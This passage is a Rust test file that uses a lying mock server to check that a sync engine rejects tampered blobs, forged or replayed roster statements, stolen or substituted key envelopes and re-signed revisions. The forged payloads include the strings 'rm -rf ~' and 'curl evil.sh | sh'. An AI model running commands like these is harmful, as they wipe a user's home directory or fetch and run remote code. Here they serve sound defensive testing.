//! A server that lies. Every test starts from an honest account (the one the
//! web's crypto code built, `sp-crypto/tests/fixtures/account.json`), lets
//! the mock server tamper with one thing, and checks the sync engine refuses
//! it with the right error and leaves this computer's files alone.

use serde::Deserialize;
use serde_json::{Value, json};
use sp_api::Client;
use sp_core::canonical::canonical_json;
use sp_core::{Credentials, Home};
use sp_crypto::pouch::{ManifestEntry, PouchKeys, RevisionBody};
use sp_crypto::vault::{
    self, KeyEnvelope, RosterStatement, open_envelopes, open_welcome, verify_roster,
};
use sp_crypto::{CryptoError, EncKey, PublicJwk, SignKey, b64, sealed};
use sp_sync::engine::{self, Options};
use sp_sync::item::PouchDir;
use sp_sync::remote::Remote;
use sp_sync::state::{PouchState, RosterPin};
use sp_sync::{Result as SyncResult, SyncError};
use std::collections::{BTreeMap, HashMap};
use std::sync::{Arc, Mutex, MutexGuard};
use wiremock::matchers::any;
use wiremock::{Mock, MockServer, Request, Respond, ResponseTemplate};

type TestResult = Result<(), Box<dyn std::error::Error>>;

const ROSTER: &str = "skillpouch/v1/roster";
const REVISION: &str = "skillpouch/v1/revision";
const REVISION_SIG: &str = "skillpouch/v1/revision-sig";
const BLOB: &str = "skillpouch/v1/blob";

#[derive(Deserialize)]
struct Fixture {
    account_id: String,
    member_id: String,
    sign_key: String,
    enc_key: String,
    welcome: String,
    roster: Vec<RosterStatement>,
    key_envelopes: Vec<KeyEnvelope>,
}

fn fixture() -> Fixture {
    let text = include_str!("../../sp-crypto/tests/fixtures/account.json");
    serde_json::from_str(text).unwrap_or_else(|e| panic!("bad fixture: {e}"))
}

/// A member key pair the test holds (the fixture's device, or one it adds).
struct Signer {
    id: String,
    sign: SignKey,
    enc: EncKey,
}

impl Signer {
    fn generate() -> Result<Self, CryptoError> {
        Ok(Self {
            id: uuid::Uuid::new_v4().to_string(),
            sign: SignKey::generate()?,
            enc: EncKey::generate()?,
        })
    }

    fn entry(&self, kind: &str) -> Result<Value, CryptoError> {
        Ok(json!({
            "id": self.id,
            "kind": kind,
            "sign_pub": self.sign.public_jwk()?,
            "enc_pub": self.enc.public_jwk()?,
            "key_storage": "file",
        }))
    }
}

/// What the server holds; tests edit it between requests.
#[derive(Default)]
struct World {
    pouch_id: String,
    pouch_key_gen: u32,
    roster: Vec<RosterStatement>,
    envelopes: Vec<KeyEnvelope>,
    artifacts: Vec<Value>,
    blobs: HashMap<String, Vec<u8>>,
    commits: usize,
}

#[derive(Clone)]
struct Evil(Arc<Mutex<World>>);

fn ok(data: Value) -> ResponseTemplate {
    ResponseTemplate::new(200).set_body_json(json!({ "ok": true, "data": data, "meta": {} }))
}

impl Respond for Evil {
    fn respond(&self, request: &Request) -> ResponseTemplate {
        let mut world = self.0.lock().unwrap_or_else(|e| e.into_inner());
        let pouch = format!("/v1/pouches/{}", world.pouch_id);
        let path = request.url.path().to_string();
        let route = path.strip_prefix(&pouch).unwrap_or(&path);
        match (request.method.as_str(), route) {
            ("GET", "/v1/pouches") => ok(json!({ "pouches": [{
                "id": world.pouch_id, "state": "active", "event_seq": 1, "created_seq": 1,
                "delete_after": null, "created_at": "2026-10-08T23:50:03.745Z",
                "epoch": "e1", "key_gen": world.pouch_key_gen,
            }]})),
            ("GET", "/v1/account/roster") => ok(json!({
                "head_seq": world.roster.len() as i64 - 1,
                "statements": world.roster,
            })),
            ("GET", "/v1/account/key-envelopes") => ok(json!({ "key_envelopes": world.envelopes })),
            ("GET", "/artifacts") => ok(json!({ "items": world.artifacts })),
            ("POST", "/blobs/fetch") => {
                let ids: Vec<String> = serde_json::from_slice::<Value>(&request.body)
                    .ok()
                    .and_then(|body| serde_json::from_value(body["ids"].clone()).ok())
                    .unwrap_or_default();
                let mut framed = Vec::new();
                for id in ids {
                    if let (Some(raw), Some(bytes)) = (b64::decode(&id), world.blobs.get(&id)) {
                        framed.extend_from_slice(&raw);
                        framed.extend_from_slice(&(bytes.len() as u32).to_be_bytes());
                        framed.extend_from_slice(bytes);
                    }
                }
                ResponseTemplate::new(200)
                    .insert_header("Content-Type", "application/octet-stream")
                    .set_body_bytes(framed)
            }
            ("POST", "/blobs/check") => ok(json!({ "missing": [] })),
            ("POST", "/operations") => {
                world.commits += 1;
                ResponseTemplate::new(500).set_body_json(json!({
                    "ok": false,
                    "error": { "code": "internal_error", "message": "not in this test", "retryable": false },
                }))
            }
            _ => ResponseTemplate::new(404).set_body_json(json!({
                "ok": false,
                "error": { "code": "not_found", "message": path, "retryable": false },
            })),
        }
    }
}

/// The honest account, the server pretending to hold it, and this computer.
struct Harness {
    world: Arc<Mutex<World>>,
    _server: MockServer,
    client: Client,
    credentials: Credentials,
    device: Signer,
    account_id: String,
    pouch_id: String,
    /// `PS_g ‖ PIS` per generation of the synced pouch.
    material: BTreeMap<u32, [u8; 64]>,
    keys: PouchKeys,
    _dir: tempfile::TempDir,
    home: Home,
    pouch_dir: PouchDir,
}

impl Harness {
    async fn new() -> Result<Self, Box<dyn std::error::Error>> {
        let fixture = fixture();
        let enc = EncKey::from_b64(&fixture.enc_key)?;
        let welcome = open_welcome(&enc, &fixture.member_id, &fixture.welcome)?;
        let roster = verify_roster(&fixture.roster, &welcome)?;
        let mut pouch_ids: Vec<&String> = roster.pouches.keys().collect();
        pouch_ids.sort();
        let pouch_id = pouch_ids[0].clone();
        let opened = open_envelopes(&roster, &fixture.key_envelopes, &fixture.member_id, &enc)?;
        let material: BTreeMap<u32, [u8; 64]> = opened
            .into_iter()
            .filter(|((id, _), _)| *id == pouch_id)
            .map(|((_, key_gen), material)| (key_gen, material))
            .collect();
        let keys = PouchKeys::new(
            &pouch_id,
            &material.iter().map(|(g, m)| (*g, *m)).collect::<Vec<_>>(),
        )?;

        let world = Arc::new(Mutex::new(World {
            pouch_id: pouch_id.clone(),
            pouch_key_gen: keys.key_gen(),
            roster: fixture.roster.clone(),
            envelopes: fixture.key_envelopes.clone(),
            ..World::default()
        }));
        let server = MockServer::start().await;
        Mock::given(any())
            .respond_with(Evil(world.clone()))
            .mount(&server)
            .await;
        let client = Client::new(&server.uri(), "skillpouch-test")?;
        let credentials = Credentials {
            format: Credentials::FORMAT,
            api_url: server.uri(),
            device_id: uuid::Uuid::new_v4().to_string(),
            storage_account_id: fixture.account_id.clone(),
            sign_key: fixture.sign_key.clone(),
            enc_key: fixture.enc_key.clone(),
            refresh_token: "r".into(),
            access_token: "a".into(),
            access_expires_at: u64::MAX,
            welcome: fixture.welcome.clone(),
            member_id: Some(fixture.member_id.clone()),
        };
        let dir = tempfile::tempdir()?;
        let home = Home::new(dir.path().join("home"));
        let pouch_dir = PouchDir::new(dir.path().join("pouch"));
        Ok(Self {
            world,
            _server: server,
            client,
            device: Signer {
                id: fixture.member_id,
                sign: SignKey::from_b64(&fixture.sign_key)?,
                enc,
            },
            credentials,
            account_id: fixture.account_id,
            pouch_id,
            material,
            keys,
            _dir: dir,
            home,
            pouch_dir,
        })
    }

    fn world(&self) -> MutexGuard<'_, World> {
        self.world.lock().unwrap_or_else(|e| e.into_inner())
    }

    fn device_key(&self) -> Result<SignKey, CryptoError> {
        SignKey::from_b64(&self.credentials.sign_key)
    }

    async fn open<'s>(&'s self, key: &'s SignKey) -> SyncResult<Remote<'s>> {
        Remote::open(
            &self.client,
            key,
            "a",
            &self.credentials,
            &self.pouch_id,
            &self.home,
        )
        .await
    }

    /// Opens the pouch and syncs it once into the test folder.
    async fn sync(&self) -> SyncResult<engine::Outcome> {
        let key = self.device_key()?;
        let remote = self.open(&key).await?;
        let mut state = PouchState::load(&self.home, &self.pouch_id)?;
        let outcome = engine::sync(&remote, &self.pouch_dir, &mut state, Options::default()).await;
        state.save(&self.home, &self.pouch_id)?;
        outcome
    }

    fn head_hash(&self) -> String {
        let world = self.world();
        world
            .roster
            .last()
            .map(|s| s.statement_hash.clone())
            .unwrap_or_default()
    }

    /// Signs the next roster statement as `signer` and appends it.
    fn append(&self, signer: &Signer, fields: Value) -> RosterStatement {
        let statement = self.statement(signer, fields);
        self.world().roster.push(statement.clone());
        statement
    }

    fn statement(&self, signer: &Signer, fields: Value) -> RosterStatement {
        let world = self.world();
        let seq = world.roster.len() as u64;
        let mut body = json!({
            "format": 1,
            "account_id": self.account_id,
            "seq": seq,
            "prev_hash": world.roster.last().map(|s| s.statement_hash.clone()),
            "created_at": "2026-10-09T00:00:00.000Z",
            "signer_member_id": signer.id,
        });
        if let (Some(body), Some(fields)) = (body.as_object_mut(), fields.as_object()) {
            body.extend(fields.clone());
        }
        let bytes = canonical_json(&body).into_bytes();
        RosterStatement {
            seq,
            statement: b64::encode(&bytes),
            statement_hash: b64::encode(blake3::hash(&bytes).as_bytes()),
            signature: signer.sign.sign(ROSTER, &bytes),
        }
    }

    /// Adds `member` to the roster, signed by this computer.
    fn add_member(&self, member: &Signer, kind: &str) -> Result<(), CryptoError> {
        let entry = member.entry(kind)?;
        self.append(&self.device, json!({ "action": "add", "member": entry }));
        Ok(())
    }

    /// An item whose head is sealed and signed like a real client would.
    fn put_item(&self, author: &Signer, name: &str, text: &str) -> Result<String, CryptoError> {
        let blob = self.keys.seal_blob(text.as_bytes())?;
        let artifact_id = uuid::Uuid::new_v4().to_string();
        let body = RevisionBody {
            format: 1,
            artifact_id: artifact_id.clone(),
            revision_id: uuid::Uuid::new_v4().to_string(),
            parent_id: None,
            merge_parent_id: None,
            kind: "skill".into(),
            scope: "global".into(),
            logical_key: name.into(),
            deleted: false,
            entries: vec![ManifestEntry {
                path: "SKILL.md".into(),
                blob: blob.id.clone(),
                size: blob.size,
                mode: "file".into(),
            }],
            roster_head: self.head_hash(),
            author_member_id: author.id.clone(),
            created_at: "2026-10-09T00:00:00.000Z".into(),
        };
        let revision = self.keys.seal_revision(&author.sign, &body)?;
        let mut world = self.world();
        world.blobs.insert(blob.id.clone(), blob.bytes);
        world.artifacts.push(json!({
            "id": artifact_id,
            "deleted_at": null,
            "updated_at": "2026-10-09T00:00:00.000Z",
            "head": {
                "id": body.revision_id,
                "artifact_id": artifact_id,
                "parent_id": null,
                "envelope": revision.envelope,
                "signature": revision.signature,
                "signer_member_id": author.id,
                "key_gen": revision.key_gen,
                "blob_ids": [blob.id],
                "created_at": "2026-10-09T00:00:00.000Z",
            },
        }));
        Ok(artifact_id)
    }

    fn head_mut<'w>(world: &'w mut World, artifact_id: &str) -> &'w mut Value {
        world
            .artifacts
            .iter_mut()
            .find(|a| a["id"] == artifact_id)
            .map(|a| &mut a["head"])
            .unwrap_or_else(|| panic!("no artifact {artifact_id}"))
    }

    fn skill_on_disk(&self, name: &str) -> Option<String> {
        std::fs::read_to_string(
            self.pouch_dir
                .root()
                .join("skills")
                .join(name)
                .join("SKILL.md"),
        )
        .ok()
    }

    /// `K_content` of generation `key_gen`, as only a member could derive it.
    fn content_key(&self, key_gen: u32) -> [u8; 32] {
        blake3::derive_key("skillpouch/v1/content", &self.material[&key_gen][..32])
    }
}

fn flip(text: &str, at: usize) -> String {
    let mut bytes = b64::decode(text).unwrap_or_default();
    let at = at.min(bytes.len() - 1);
    bytes[at] ^= 0x01;
    b64::encode(&bytes)
}

fn is_crypto(error: &SyncError, check: impl Fn(&CryptoError) -> bool) -> bool {
    matches!(error, SyncError::Crypto(inner) if check(inner))
}

fn expect_roster(error: &SyncError, needle: &str) {
    assert!(
        is_crypto(
            error,
            |e| matches!(e, CryptoError::Roster(m) if m.contains(needle))
        ),
        "expected roster error with {needle:?}, got {error:?}"
    );
}

fn expect_signature(error: &SyncError) {
    assert!(
        is_crypto(error, |e| matches!(e, CryptoError::Signature(_))),
        "expected a signature error, got {error:?}"
    );
}

// ---- the honest baseline -------------------------------------------------------------

#[tokio::test]
async fn an_honest_server_syncs() -> TestResult {
    let h = Harness::new().await?;
    h.put_item(&h.device, "pdf", "# PDF\n")?;
    let outcome = h.sync().await?;
    assert_eq!((outcome.received, outcome.unreadable), (1, 0));
    assert_eq!(h.skill_on_disk("pdf").as_deref(), Some("# PDF\n"));
    // The newest roster verified is pinned.
    let pin = RosterPin::load(&h.home)?.ok_or("no pin")?;
    assert_eq!(pin.head_seq, 7);
    Ok(())
}

// ---- blobs ---------------------------------------------------------------------------

#[tokio::test]
async fn a_bit_flipped_blob_fails_authentication_and_writes_nothing() -> TestResult {
    let h = Harness::new().await?;
    h.put_item(&h.device, "pdf", "# PDF\n")?;
    for blob in h.world().blobs.values_mut() {
        let last = blob.len() - 1;
        blob[last] ^= 0x80;
    }
    let error = h.sync().await.err().ok_or("accepted a flipped blob")?;
    assert!(
        is_crypto(&error, |e| matches!(e, CryptoError::Aead)),
        "{error:?}"
    );
    assert_eq!(h.skill_on_disk("pdf"), None);
    Ok(())
}

#[tokio::test]
async fn a_blob_served_under_another_id_is_refused() -> TestResult {
    let h = Harness::new().await?;
    h.put_item(&h.device, "a", "first\n")?;
    h.put_item(&h.device, "b", "second\n")?;
    {
        let mut world = h.world();
        let ids: Vec<String> = world.blobs.keys().cloned().collect();
        let (x, y) = (world.blobs[&ids[0]].clone(), world.blobs[&ids[1]].clone());
        world.blobs.insert(ids[0].clone(), y);
        world.blobs.insert(ids[1].clone(), x);
    }
    let error = h.sync().await.err().ok_or("accepted swapped blobs")?;
    assert!(
        is_crypto(&error, |e| matches!(e, CryptoError::Aead)),
        "{error:?}"
    );
    assert_eq!(h.skill_on_disk("a"), None);
    assert_eq!(h.skill_on_disk("b"), None);
    Ok(())
}

#[tokio::test]
async fn blob_content_that_does_not_match_its_keyed_id_is_refused() -> TestResult {
    let h = Harness::new().await?;
    let artifact = h.put_item(&h.device, "pdf", "# PDF\n")?;
    {
        // Sealed by someone holding the keys, but under the id of other content.
        let mut world = h.world();
        let id = Harness::head_mut(&mut world, &artifact)["blob_ids"][0]
            .as_str()
            .unwrap_or_default()
            .to_string();
        let aad = [
            BLOB.as_bytes(),
            h.pouch_id.as_bytes(),
            &b64::decode(&id).unwrap_or_default(),
        ]
        .concat();
        let key_gen = h.keys.key_gen();
        let forged = sealed::seal(&h.content_key(key_gen), key_gen, b"rm -rf ~\n", &aad)?;
        world.blobs.insert(id, forged);
    }
    let error = h.sync().await.err().ok_or("accepted a mislabelled blob")?;
    assert!(
        is_crypto(
            &error,
            |e| matches!(e, CryptoError::Format(m) if m.contains("does not match its id"))
        ),
        "{error:?}"
    );
    assert_eq!(h.skill_on_disk("pdf"), None);
    Ok(())
}

// ---- revisions -----------------------------------------------------------------------

/// Syncs `pdf` honestly, lets the server tamper with its head, syncs again:
/// the item is unreadable and this computer's copy stays as it was.
async fn tampered_head_is_held(tamper: impl FnOnce(&Harness, &mut Value)) -> TestResult {
    let h = Harness::new().await?;
    let artifact = h.put_item(&h.device, "pdf", "# PDF\n")?;
    h.sync().await?;
    assert_eq!(h.skill_on_disk("pdf").as_deref(), Some("# PDF\n"));
    {
        let mut world = h.world();
        let head = Harness::head_mut(&mut world, &artifact);
        tamper(&h, head);
    }
    let outcome = h.sync().await?;
    assert_eq!(outcome.unreadable, 1);
    assert_eq!((outcome.sent, outcome.received), (0, 0));
    assert_eq!(
        h.skill_on_disk("pdf").as_deref(),
        Some("# PDF\n"),
        "local copy changed"
    );
    assert_eq!(h.world().commits, 0, "sent something about a tampered item");
    let state = PouchState::load(&h.home, &h.pouch_id)?;
    assert!(state.items.contains_key("skill/pdf"), "forgot the item");
    Ok(())
}

#[tokio::test]
async fn a_revision_with_a_flipped_signature_is_refused_and_nothing_is_deleted() -> TestResult {
    tampered_head_is_held(|_, head| {
        head["signature"] = json!(flip(head["signature"].as_str().unwrap_or_default(), 10));
    })
    .await
}

#[tokio::test]
async fn a_revision_with_a_flipped_envelope_is_refused() -> TestResult {
    tampered_head_is_held(|_, head| {
        head["envelope"] = json!(flip(head["envelope"].as_str().unwrap_or_default(), 40));
    })
    .await
}

#[tokio::test]
async fn a_revision_signed_by_a_stranger_is_refused() -> TestResult {
    tampered_head_is_held(|h, head| {
        // Same bytes, re-signed by a key that is not in the roster.
        let stranger = SignKey::generate().unwrap_or_else(|e| panic!("{e}"));
        let envelope =
            b64::decode(head["envelope"].as_str().unwrap_or_default()).unwrap_or_default();
        let id = head["id"].as_str().unwrap_or_default().to_string();
        let message = [
            h.pouch_id.as_bytes(),
            id.as_bytes(),
            blake3::hash(&envelope).as_bytes(),
        ]
        .concat();
        head["signature"] = json!(stranger.sign(REVISION_SIG, &message));
    })
    .await
}

#[tokio::test]
async fn a_revision_claimed_by_an_unknown_member_is_refused() -> TestResult {
    tampered_head_is_held(|_, head| {
        head["signer_member_id"] = json!(uuid::Uuid::new_v4().to_string());
    })
    .await
}

#[tokio::test]
async fn a_re_parented_revision_is_refused() -> TestResult {
    tampered_head_is_held(|_, head| {
        head["parent_id"] = json!(uuid::Uuid::new_v4().to_string());
    })
    .await
}

#[tokio::test]
async fn an_envelope_moved_to_another_artifact_is_refused() -> TestResult {
    let h = Harness::new().await?;
    let a = h.put_item(&h.device, "a", "A\n")?;
    let b = h.put_item(&h.device, "b", "B\n")?;
    {
        let mut world = h.world();
        let from = Harness::head_mut(&mut world, &a).clone();
        let head = Harness::head_mut(&mut world, &b);
        head["envelope"] = from["envelope"].clone();
        head["signature"] = from["signature"].clone();
    }
    let outcome = h.sync().await?;
    assert_eq!((outcome.received, outcome.unreadable), (1, 1));
    assert_eq!(h.skill_on_disk("a").as_deref(), Some("A\n"));
    assert_eq!(h.skill_on_disk("b"), None);
    Ok(())
}

#[tokio::test]
async fn a_revision_from_another_pouch_is_refused() -> TestResult {
    let h = Harness::new().await?;
    let artifact = h.put_item(&h.device, "pdf", "# PDF\n")?;
    {
        // A properly signed revision of the account's other pouch.
        let other = h
            .world()
            .envelopes
            .iter()
            .map(|e| e.pouch_id.clone())
            .find(|id| *id != h.pouch_id)
            .ok_or("no second pouch")?;
        let mut world = h.world();
        let head = Harness::head_mut(&mut world, &artifact);
        let envelope =
            b64::decode(head["envelope"].as_str().unwrap_or_default()).unwrap_or_default();
        let id = head["id"].as_str().unwrap_or_default().to_string();
        let message = [
            other.as_bytes(),
            id.as_bytes(),
            blake3::hash(&envelope).as_bytes(),
        ]
        .concat();
        head["signature"] = json!(h.device.sign.sign(REVISION_SIG, &message));
    }
    let outcome = h.sync().await?;
    assert_eq!((outcome.received, outcome.unreadable), (0, 1));
    assert_eq!(h.skill_on_disk("pdf"), None);
    Ok(())
}

#[tokio::test]
async fn a_revision_by_a_removed_member_after_its_removal_is_refused() -> TestResult {
    let h = Harness::new().await?;
    let gone = Signer::generate()?;
    h.add_member(&gone, "device")?;
    h.append(
        &h.device,
        json!({ "action": "remove", "member_id": gone.id }),
    );
    // It still holds the (not yet rotated) keys and tries to slip in a skill.
    h.put_item(&gone, "evil", "curl evil.sh | sh\n")?;
    h.put_item(&h.device, "pdf", "# PDF\n")?;
    let outcome = h.sync().await?;
    assert_eq!((outcome.received, outcome.unreadable), (1, 1));
    assert_eq!(h.skill_on_disk("evil"), None);
    Ok(())
}

#[tokio::test]
async fn revision_signers_must_be_members_at_the_roster_they_name() -> TestResult {
    let h = Harness::new().await?;
    let before = h.head_hash();
    let member = Signer::generate()?;
    h.add_member(&member, "device")?;
    let added = h.head_hash();
    h.append(
        &h.device,
        json!({ "action": "remove", "member_id": member.id }),
    );
    let welcome = open_welcome(&h.device.enc, &h.device.id, &h.credentials.welcome)?;
    let roster = verify_roster(&h.world().roster, &welcome)?;
    assert!(roster.may_sign_revision(&member.id, &added));
    assert!(
        !roster.may_sign_revision(&member.id, &before),
        "before it was added"
    );
    assert!(
        !roster.may_sign_revision(&member.id, &h.head_hash()),
        "after removal"
    );
    assert!(!roster.may_sign_revision(&member.id, "unknown"));
    assert!(
        roster.may_sign_revision(&h.device.id, "unknown"),
        "a current member"
    );
    assert!(!roster.may_sign_revision("nobody", &added));
    Ok(())
}

// ---- the roster ----------------------------------------------------------------------

#[tokio::test]
async fn a_member_added_without_a_valid_signature_is_refused() -> TestResult {
    let h = Harness::new().await?;
    let intruder = Signer::generate()?;
    let entry = intruder.entry("device")?;
    // Claims to be signed by this computer, signed by the intruder.
    let mut forged = h.statement(&h.device, json!({ "action": "add", "member": entry }));
    let bytes = b64::decode(&forged.statement).unwrap_or_default();
    forged.signature = intruder.sign.sign(ROSTER, &bytes);
    h.world().roster.push(forged);
    let key = h.device_key()?;
    expect_signature(&h.open(&key).await.err().ok_or("accepted a forged member")?);
    Ok(())
}

#[tokio::test]
async fn a_member_signed_in_by_a_non_member_is_refused() -> TestResult {
    let h = Harness::new().await?;
    let intruder = Signer::generate()?;
    let entry = intruder.entry("device")?;
    h.append(&intruder, json!({ "action": "add", "member": entry }));
    let key = h.device_key()?;
    expect_signature(
        &h.open(&key)
            .await
            .err()
            .ok_or("accepted a self-signed member")?,
    );
    Ok(())
}

#[tokio::test]
async fn an_edited_statement_is_refused() -> TestResult {
    let h = Harness::new().await?;
    {
        let mut world = h.world();
        let statement = &mut world.roster[3];
        statement.statement = flip(&statement.statement, 30);
    }
    let key = h.device_key()?;
    let error = h
        .open(&key)
        .await
        .err()
        .ok_or("accepted an edited statement")?;
    assert!(
        is_crypto(&error, |e| matches!(e, CryptoError::Roster(_))),
        "{error:?}"
    );
    Ok(())
}

#[tokio::test]
async fn reordered_or_replayed_statements_are_refused() -> TestResult {
    let h = Harness::new().await?;
    let honest = h.world().roster.clone();
    let key = h.device_key()?;

    let mut reordered = honest.clone();
    reordered.swap(5, 6);
    let (a, b) = (reordered[5].seq, reordered[6].seq);
    reordered[5].seq = b;
    reordered[6].seq = a;
    h.world().roster = reordered;
    expect_roster(
        &h.open(&key)
            .await
            .err()
            .ok_or("accepted a reordered roster")?,
        "",
    );

    let mut replayed = honest.clone();
    let mut again = honest[4].clone();
    again.seq = 8;
    replayed.push(again);
    h.world().roster = replayed;
    expect_roster(
        &h.open(&key)
            .await
            .err()
            .ok_or("accepted a replayed statement")?,
        "",
    );
    Ok(())
}

#[tokio::test]
async fn a_roster_rolled_back_below_what_this_computer_saw_is_refused() -> TestResult {
    let h = Harness::new().await?;
    let member = Signer::generate()?;
    h.add_member(&member, "device")?;
    h.append(
        &h.device,
        json!({ "action": "remove", "member_id": member.id }),
    );
    let key = h.device_key()?;
    h.open(&key).await?;
    assert_eq!(RosterPin::load(&h.home)?.map(|p| p.head_seq), Some(9));

    // Hide the removal again (the welcome alone only pins seq 7).
    h.world().roster.truncate(9);
    expect_roster(
        &h.open(&key).await.err().ok_or("accepted a rollback")?,
        "went backwards",
    );
    Ok(())
}

#[tokio::test]
async fn a_forked_roster_is_refused() -> TestResult {
    let h = Harness::new().await?;
    let honest = h.world().roster.clone();
    let key = h.device_key()?;
    h.add_member(&Signer::generate()?, "device")?;
    h.open(&key).await?;

    // Another seq 8 for this computer: same signer, different member.
    h.world().roster = honest;
    h.add_member(&Signer::generate()?, "device")?;
    expect_roster(
        &h.open(&key).await.err().ok_or("accepted a fork")?,
        "changed after this computer saw it",
    );
    Ok(())
}

#[tokio::test]
async fn a_different_genesis_or_another_accounts_roster_is_refused() -> TestResult {
    let h = Harness::new().await?;
    let honest = h.world().roster.clone();
    let key = h.device_key()?;

    // A fresh, validly signed roster of another account.
    let stranger = Signer::generate()?;
    let mut other = json!({
        "format": 1, "account_id": uuid::Uuid::new_v4().to_string(), "seq": 0,
        "prev_hash": null, "action": "genesis", "created_at": "2026-10-09T00:00:00.000Z",
        "signer_member_id": stranger.id, "members": [stranger.entry("browser")?],
    });
    let bytes = canonical_json(&other).into_bytes();
    let foreign = RosterStatement {
        seq: 0,
        statement: b64::encode(&bytes),
        statement_hash: b64::encode(blake3::hash(&bytes).as_bytes()),
        signature: stranger.sign.sign(ROSTER, &bytes),
    };
    h.world().roster = vec![foreign];
    expect_roster(
        &h.open(&key).await.err().ok_or("accepted another account")?,
        "another account",
    );

    // Same account, but a genesis this computer never trusted.
    other["account_id"] = json!(h.account_id);
    let bytes = canonical_json(&other).into_bytes();
    let mut roster = honest;
    roster[0] = RosterStatement {
        seq: 0,
        statement: b64::encode(&bytes),
        statement_hash: b64::encode(blake3::hash(&bytes).as_bytes()),
        signature: stranger.sign.sign(ROSTER, &bytes),
    };
    h.world().roster = roster;
    expect_roster(
        &h.open(&key).await.err().ok_or("accepted a new genesis")?,
        "genesis differs",
    );
    Ok(())
}

// ---- key envelopes ---------------------------------------------------------------------

fn envelope_index(world: &World, pouch_id: &str, key_gen: u32) -> usize {
    world
        .envelopes
        .iter()
        .position(|e| e.pouch_id == pouch_id && e.key_gen == key_gen)
        .unwrap_or_else(|| panic!("no envelope for generation {key_gen}"))
}

#[tokio::test]
async fn a_withheld_newest_key_generation_is_refused() -> TestResult {
    let h = Harness::new().await?;
    {
        let mut world = h.world();
        let at = envelope_index(&world, &h.pouch_id, 2);
        world.envelopes.remove(at);
        // …and the server claims generation 1 is the newest.
        world.pouch_key_gen = 1;
    }
    let key = h.device_key()?;
    expect_roster(
        &h.open(&key)
            .await
            .err()
            .ok_or("would write with a downgraded key")?,
        "withheld key generation 2",
    );
    Ok(())
}

#[tokio::test]
async fn an_envelope_for_another_recipient_does_not_open() -> TestResult {
    let h = Harness::new().await?;
    let other = Signer::generate()?;
    let recipient = (other.id.as_str(), &other.enc.public_jwk()?);
    let mut envelope = vault::seal_key_envelope(
        (&h.device.id, &h.device.sign),
        recipient,
        &h.pouch_id,
        2,
        &h.material[&2],
    )?;
    // Relabelled for this computer: the signature binds the recipient.
    envelope.member_id = h.device.id.clone();
    {
        let mut world = h.world();
        let at = envelope_index(&world, &h.pouch_id, 2);
        world.envelopes[at] = envelope;
    }
    let key = h.device_key()?;
    expect_roster(
        &h.open(&key)
            .await
            .err()
            .ok_or("used an envelope for someone else")?,
        "withheld key generation 2",
    );
    Ok(())
}

#[tokio::test]
async fn a_substituted_pouch_key_is_refused() -> TestResult {
    let h = Harness::new().await?;
    let me = (h.device.id.as_str(), &h.device.enc.public_jwk()?);
    let mut fake = h.material[&2];
    fake[..32].copy_from_slice(&[7u8; 32]);
    let key = h.device_key()?;

    // A second, different key for generation 2.
    let substitute =
        vault::seal_key_envelope((&h.device.id, &h.device.sign), me, &h.pouch_id, 2, &fake)?;
    h.world().envelopes.push(substitute.clone());
    expect_roster(
        &h.open(&key)
            .await
            .err()
            .ok_or("accepted two keys for one generation")?,
        "two different keys",
    );

    // Only the substitute, with an identity secret of its own.
    let mut other_pis = fake;
    other_pis[32..].copy_from_slice(&[9u8; 32]);
    {
        let mut world = h.world();
        world.envelopes.pop();
        let at = envelope_index(&world, &h.pouch_id, 2);
        world.envelopes[at] = vault::seal_key_envelope(
            (&h.device.id, &h.device.sign),
            me,
            &h.pouch_id,
            2,
            &other_pis,
        )?;
    }
    expect_roster(
        &h.open(&key)
            .await
            .err()
            .ok_or("accepted a second identity secret")?,
        "two identity secrets",
    );
    Ok(())
}

#[tokio::test]
async fn envelopes_from_removed_members_or_for_unannounced_generations_are_ignored() -> TestResult {
    let h = Harness::new().await?;
    let gone = Signer::generate()?;
    h.add_member(&gone, "device")?;
    h.append(
        &h.device,
        json!({ "action": "remove", "member_id": gone.id }),
    );
    let me = (h.device.id.as_str(), &h.device.enc.public_jwk()?);
    let mut fake = h.material[&2];
    fake[..32].copy_from_slice(&[7u8; 32]);
    {
        let mut world = h.world();
        // The removed member hands out a key it chose for the newest generation…
        let at = envelope_index(&world, &h.pouch_id, 2);
        world.envelopes[at] =
            vault::seal_key_envelope((&gone.id, &gone.sign), me, &h.pouch_id, 2, &fake)?;
    }
    let key = h.device_key()?;
    expect_roster(
        &h.open(&key)
            .await
            .err()
            .ok_or("took a key from a removed member")?,
        "withheld key generation 2",
    );

    // …or a member seals a generation 3 no `rotate_keys` ever announced.
    {
        let mut world = h.world();
        world.envelopes = fixture().key_envelopes;
        world.envelopes.push(vault::seal_key_envelope(
            (&h.device.id, &h.device.sign),
            me,
            &h.pouch_id,
            3,
            &fake,
        )?);
    }
    let remote = h.open(&key).await?;
    assert_eq!(remote.keys().key_gen(), 2);
    Ok(())
}

#[tokio::test]
async fn envelopes_from_unknown_members_are_ignored() -> TestResult {
    let h = Harness::new().await?;
    let stranger = Signer::generate()?;
    let me = (h.device.id.as_str(), &h.device.enc.public_jwk()?);
    {
        let mut world = h.world();
        let at = envelope_index(&world, &h.pouch_id, 2);
        world.envelopes[at] = vault::seal_key_envelope(
            (&stranger.id, &stranger.sign),
            me,
            &h.pouch_id,
            2,
            &h.material[&2],
        )?;
    }
    let key = h.device_key()?;
    expect_roster(
        &h.open(&key)
            .await
            .err()
            .ok_or("took a key from a stranger")?,
        "withheld key generation 2",
    );
    Ok(())
}

#[tokio::test]
async fn a_rotation_the_roster_announces_with_its_envelope_is_followed() -> TestResult {
    let h = Harness::new().await?;
    let me = (h.device.id.as_str(), &h.device.enc.public_jwk()?);
    let mut next = h.material[&2];
    next[..32].copy_from_slice(&[5u8; 32]);
    h.append(
        &h.device,
        json!({ "action": "rotate_keys", "new_generations": { h.pouch_id.clone(): 3 } }),
    );
    {
        let mut world = h.world();
        world.envelopes.push(vault::seal_key_envelope(
            (&h.device.id, &h.device.sign),
            me,
            &h.pouch_id,
            3,
            &next,
        )?);
        world.pouch_key_gen = 3;
    }
    let key = h.device_key()?;
    assert_eq!(h.open(&key).await?.keys().key_gen(), 3);
    Ok(())
}

#[tokio::test]
async fn a_revision_signed_with_a_context_for_something_else_is_refused() -> TestResult {
    tampered_head_is_held(|h, head| {
        // A valid signature by this computer, but over the revision AAD context.
        let envelope =
            b64::decode(head["envelope"].as_str().unwrap_or_default()).unwrap_or_default();
        let id = head["id"].as_str().unwrap_or_default().to_string();
        let message = [
            h.pouch_id.as_bytes(),
            id.as_bytes(),
            blake3::hash(&envelope).as_bytes(),
        ]
        .concat();
        head["signature"] = json!(h.device.sign.sign(REVISION, &message));
    })
